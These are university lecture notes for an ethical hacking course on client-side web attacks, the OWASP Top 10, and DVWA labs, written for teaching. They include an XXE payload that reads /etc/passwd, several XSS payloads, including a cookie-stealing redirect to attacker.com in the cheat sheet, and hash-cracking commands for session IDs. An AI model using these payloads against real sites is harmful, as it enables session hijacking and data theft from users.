# Week 6 — Web Application Attacks (Client Side)

> **Module:** UOP M31880 Ethical Hacking
> **Lecturer:** Tobi Fajana
> **Topic:** Web Application Attacks — Client Side (XSS, Session Hijacking, OWASP Top 10)

---

## Table of Contents

1. [How Web Applications Work](#1-how-web-applications-work)
2. [HTTP Protocol Essentials](#2-http-protocol-essentials)
3. [Client-Side vs Server-Side Attacks](#3-client-side-vs-server-side-attacks)
4. [HTTP Security Mechanisms](#4-http-security-mechanisms)
5. [OWASP Top 10 — Overview](#5-owasp-top-10--overview)
6. [A1: Injection Attacks](#6-a1-injection-attacks)
7. [A2: Broken Authentication & Session Management](#7-a2-broken-authentication--session-management)
8. [A3: Sensitive Data Exposure](#8-a3-sensitive-data-exposure)
9. [A4: XML External Entity (XXE)](#9-a4-xml-external-entity-xxe)
10. [A5–A9: Further OWASP Vulnerabilities](#10-a5a9-further-owasp-vulnerabilities)
11. [Lab — Cross-Site Scripting (XSS)](#11-lab--cross-site-scripting-xss)
12. [Lab — Weak Session Management](#12-lab--weak-session-management)
13. [Cheat Sheet](#13-cheat-sheet)
14. [Recommended TryHackMe Labs](#14-recommended-tryhackme-labs)

---

## 1. How Web Applications Work

### Web Server (Application Server)

A web server is software (or hardware) that satisfies client requests over the World Wide Web:

- Primary function: serve HTML content
- Supports server-side scripting (PHP, Python, Node.js)
- Connects to databases
- Handles load balancing and monitoring

### Request-Response Cycle

```
┌──────────┐    HTTP Request     ┌──────────┐
│  Client   │ ─────────────────→ │  Server   │
│  Browser  │                    │  Web App  │
│  Crawler  │ ←───────────────── │  Database │
│  Script   │    HTTP Response   │           │
└──────────┘                     └──────────┘
```

---

## 2. HTTP Protocol Essentials

### Key Properties

| Property | Description |
|---|---|
| **Simple but extensible** | Easy to understand, supports custom headers |
| **Stateless** | Each request is independent — no memory of previous requests |
| **Not sessionless** | Uses cookies/tokens to maintain sessions despite being stateless |
| **Connectionless** | Connections close after each request-response pair |

### HTTP Methods

| Method | Purpose |
|---|---|
| **GET** | Retrieve data from the server |
| **POST** | Send/store data on the server |
| **PUT** | Update existing data |
| **DELETE** | Remove data |

### HTTP Status Codes

| Code Range | Meaning | Example |
|---|---|---|
| **1XX** | Informational | 100 Continue |
| **2XX** | Success | 200 OK |
| **3XX** | Redirection | 301 Moved Permanently |
| **4XX** | Client Error | 404 Not Found |
| **5XX** | Server Error | 500 Internal Server Error |

---

## 3. Client-Side vs Server-Side Attacks

| | Client-Side | Server-Side |
|---|---|---|
| **Where** | Browser / end device | Web server |
| **Technologies** | HTML, JavaScript, CSS | PHP, Python, Database, Auth |
| **Impact** | Compromises **users** (including admins) | Compromises the **server** |
| **Examples** | XSS, CSRF, clickjacking | SQLi, command injection, file inclusion |

---

## 4. HTTP Security Mechanisms

| Mechanism | Purpose |
|---|---|
| **Authentication** | Verify identity (usually challenge-response) |
| **Sessions** | Maintain state across stateless HTTP (request-response pairs) |
| **Cookies** | Store session IDs and other state on the client |
| **Encryption** | HTTPS/TLS for data in transit |
| **CORS** | Relaxing/enforcing the same-origin policy |

---

## 5. OWASP Top 10 — Overview

The **OWASP Top 10** is the standard awareness document for web application security risks:

| # | Vulnerability | Category |
|---|---|---|
| A1 | Injection | Server-side |
| A2 | Broken Authentication | Both |
| A3 | Sensitive Data Exposure | Both |
| A4 | XML External Entity (XXE) | Server-side |
| A5 | Broken Access Control | Server-side |
| A6 | Security Misconfiguration | Both |
| A7 | Cross-Site Scripting (XSS) | Client-side |
| A8 | Insecure Deserialization | Server-side |
| A9 | Components with Known Vulnerabilities | Both |
| A10 | Insufficient Logging & Monitoring | Server-side |

> **Reference:** [OWASP Top 10](https://owasp.org/www-project-top-ten/)

---

## 6. A1: Injection Attacks

Trick an interpreter into executing unintended commands by sending untrusted data as part of a command or query.

### Attack Vectors
- Environment variables, parameters, GET/POST requests
- Any source that accepts user input

### Weaknesses Exploited
- Database queries (SQL injection)
- LDAP queries
- OS commands (command injection)

### How to Find Them
1. Find all sources for sending data
2. Understand how data is interpreted and processed
3. Fuzz (manually, Burp Suite Intruder, SQLMap)

### Prevention
- Validate, filter, and sanitise all inputs
- Use parameterised queries and stored procedures
- Whitelist server-side input validation
- Use database controls like `LIMIT` to prevent mass disclosure
- Deploy Web Application Firewalls (WAF), IDS/IPS

---

## 7. A2: Broken Authentication & Session Management

Incorrect implementation of authentication or session management that allows attackers to compromise credentials or assume another user's identity.

### Attack Threats
- Default credentials
- Password reuse / credential stuffing
- Dictionary / brute-force attacks
- Poor session management

### Session Attacks

| Attack | Description |
|---|---|
| **Session Hijacking** | Stealing a valid session ID to impersonate a user |
| **Session Fixation** | Forcing a known session ID onto a victim (new session ID not assigned) |
| **Session Prediction** | Guessing session IDs based on patterns (e.g., `SEQ101120151633`) |
| **MITM** | Intercepting traffic between client and server |
| **Man-in-the-Browser** | Malware in the browser intercepting requests |
| **XSS-based** | Stealing cookies via `document.cookie` |

### How to Attack Sessions
1. Understand how sessions are authenticated
2. **Predict** — Analyse patterns (e.g., sequential IDs)
3. **Intercept** — MITM, man-in-the-browser, malware
4. **Steal** — Client-side attacks like XSS: `document.write('cookie: ' + document.cookie)`
5. **Social Engineering** — Trick users into revealing session tokens
6. **Fuzzing** — Brute-force session ID space

### Prevention
- Multi-factor authentication
- No default or weak credentials; frequent password checks
- Follow NIST 800-63 B guidelines (Section 5.1.1)
- Delay and limit failed login attempts
- Use server-side session manager; rotate session IDs
- Properly invalidate sessions during inactivity or logout
- Advanced techniques: IP/location tracking, behaviour analytics, browser fingerprinting

---

## 8. A3: Sensitive Data Exposure

Data exposed in plain text while in transit, from the client, or from the server.

### Attack Threats
- No encryption in transit
- Data not hashed at rest
- Weak cryptographic algorithms
- MITM attacks (Rogue AP, Evil Twin)

### Real-World Example
Facebook stored hundreds of millions of passwords in **plain text** — accessible to internal employees.

### Prevention
- Classify data according to privacy laws (PII, PCI, PHI, GDPR)
- Encrypt data at rest (database encryption)
- Strong encryption with perfect forward secrecy + HTTP Strict Transport Security (HSTS)
- Disable caching for responses with sensitive data
- Don't store sensitive data unless absolutely required
- Store passwords as **salted hashes** (but note: GPUs can still crack salted hashes)

---

## 9. A4: XML External Entity (XXE)

Attackers exploit vulnerable XML processors to include hostile content in XML documents.

### Example — Viewing /etc/passwd

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<foo>&xxe;</foo>
```

### Prevention
- Use static and dynamic application security testing (OWASP ZAP)
- Use less complex data formats like **JSON** when possible
- Avoid serialisation of sensitive data
- Implement positive (whitelisting) server-side validation

> **Reference:** [PortSwigger XXE Guide](https://portswigger.net/web-security/xxe)

---

## 10. A5–A9: Further OWASP Vulnerabilities

### A5: Broken Access Control

Weak or no enforcement of access restrictions on files, accounts, resources.

**Prevention:** Need-to-know / need-to-access. Deny by default. Disable directory listing. Remove `.git` and backup files from web roots. Log access control failures.

### A6: Security Misconfiguration

- Missing security hardening
- Default usernames and passwords
- Error messages revealing information
- Unnecessary features/ports enabled
- Vulnerable/outdated software
- Dev notes, backups, sample apps not removed

### A7: Cross-Site Scripting (XSS)

Malicious scripts injected into trusted websites. *(Covered in detail in the lab section below.)*

### A8: Insecure Deserialization

**Serialisation:** Converting objects to a data format for storage/transmission.
**Deserialisation:** Rebuilding objects from stored data.

Threat vectors: HTTP cookies, form parameters, caching, auth tokens.

### A9: Components with Known Vulnerabilities

- Remove unused dependencies, features, components
- Continuously inventory software versions
- Only obtain packages from known/signed sources
- Monitor libraries and components
- Regularly scan applications and servers

**Problem:** Some devices are impossible to patch (IoT). Example: Struts 2 RCE (CVE-2017-5638).

**Example:** Heartbleed — OpenSSL vulnerability that leaked server memory contents.

---

## 11. Lab — Cross-Site Scripting (XSS)

### Setup

1. Log into DVWA: `http://<target-ip>/dvwa/`
2. Set security to **Low**: `http://<target-ip>/dvwa/security.php`

### Reflected XSS

Reflected XSS executes in the page response — it's **not stored** on the server.

**Step 1 — Test for filtering:**
```html
<p> This is 2025. </p>
```
If the HTML renders, there's no input filtering.

**Step 2 — Execute JavaScript:**
```html
<script> alert() </script>
```

**Step 3 — Return a value:**
```html
<script> alert("This is 2025.") </script>
```

**Step 4 — Steal cookies (Session Hijacking):**
```html
<script> alert(document.cookie) </script>
```

> The stolen cookie can be used to log into the same web app from another browser — this is **session hijacking**.

### Stored XSS

Same payloads, but the script is **saved on the server** and executes every time a victim visits the page.

Navigate to: `http://<target-ip>/dvwa/vulnerabilities/xss_s/`

Any XSS payload submitted here will persist and execute for all visitors.

### Key Difference

| Type | Persistence | Trigger |
|---|---|---|
| **Reflected** | Temporary — only in the response | Victim clicks a crafted link |
| **Stored** | Persistent — saved on server | Victim visits the page |

---

## 12. Lab — Weak Session Management

Session IDs stored in cookies maintain user sessions. Weak session IDs lack sufficient randomness.

### Analysing Session IDs (Low Security)

1. Log into DVWA, set security to **Low**
2. Right-click → Inspect → Application/Storage → Cookies
3. Find the session ID — it looks random but may not be
4. Use a **hash analyser** to identify the hash/integer type
5. Generate multiple session IDs by logging in repeatedly
6. Look for patterns (sequential? timestamp-based? predictable?)

### Cracking Session IDs

```bash
# Generate a sequential number list
seq 1 4000000000 > seq_numbers.txt

# Use John the Ripper to crack hashed session IDs
john --wordlist=rockyou.txt session_hashes.txt

# Or use hashcat
hashcat -m <hash-type> session_hashes.txt rockyou.txt
```

> **Task:** Discover how the session ID is created/hashed using both active and passive techniques. Document the process for your report.

---

## 13. Cheat Sheet

### XSS Payloads

```html
<!-- Test for filtering -->
<p>Test</p>

<!-- Basic alert -->
<script>alert()</script>

<!-- Alert with message -->
<script>alert("XSS")</script>

<!-- Steal cookies -->
<script>alert(document.cookie)</script>

<!-- Redirect with cookies -->
<script>document.location='http://attacker.com/steal?c='+document.cookie</script>

<!-- Image tag (bypasses some filters) -->
<img src=x onerror=alert(document.cookie)>
```

### XSS Prevention (Server-Side)

```
Replace < with &lt;
Replace > with &gt;
Replace " with &quot;
Replace ' with &#x27;
Use Content-Security-Policy headers
Use HttpOnly flag on cookies
```

### HTTP Quick Reference

```
GET    → Retrieve data       POST   → Submit data
PUT    → Update data         DELETE → Remove data

1XX → Informational    2XX → Success
3XX → Redirection      4XX → Client Error    5XX → Server Error
```

### OWASP Top 10 Quick Reference

```
A1  Injection               → Parameterised queries, input validation
A2  Broken Auth              → MFA, session rotation, NIST 800-63
A3  Sensitive Data Exposure  → Encrypt at rest + transit, HSTS
A4  XXE                      → Use JSON, disable external entities
A5  Broken Access Control    → Deny by default, log failures
A6  Security Misconfig       → Remove defaults, harden, patch
A7  XSS                      → Output encoding, CSP headers
A8  Insecure Deserialization → Validate serialised data, type checks
A9  Known Vulnerabilities    → Inventory, patch, monitor components
A10 Insufficient Logging     → Log security events, alert on failures
```

### Tools

```bash
# OWASP ZAP — automated web app scanner
zaproxy

# Burp Suite — intercepting proxy
burpsuite

# Session analysis
# Right-click → Inspect → Application → Cookies
```

---

## 14. Recommended TryHackMe Labs

| Room | Difficulty | Free? | Why It's Relevant |
|---|---|---|---|
| [OWASP Top 10](https://tryhackme.com/room/owasptop10) | Easy | Free | Walk through each OWASP Top 10 vulnerability with practical exercises |
| [Cross-Site Scripting](https://tryhackme.com/room/xss) | Easy | Sub | Reflected, stored, and DOM-based XSS with hands-on exploitation |
| [OWASP Juice Shop](https://tryhackme.com/room/owaspjuiceshop) | Easy | Free | Practice web app attacks against a deliberately vulnerable application |
| [Burp Suite: The Basics](https://tryhackme.com/room/burpsuitebasics) | Easy | Free | Learn the intercepting proxy essential for web app testing |
| [Authentication Bypass](https://tryhackme.com/room/authenticationbypass) | Easy | Sub | Exploit broken authentication and session management flaws |

**Suggested order:** OWASP Top 10 → Burp Suite → OWASP Juice Shop → Cross-Site Scripting → Authentication Bypass

---

*Week 6 of 12 — UOP M31880 Ethical Hacking*
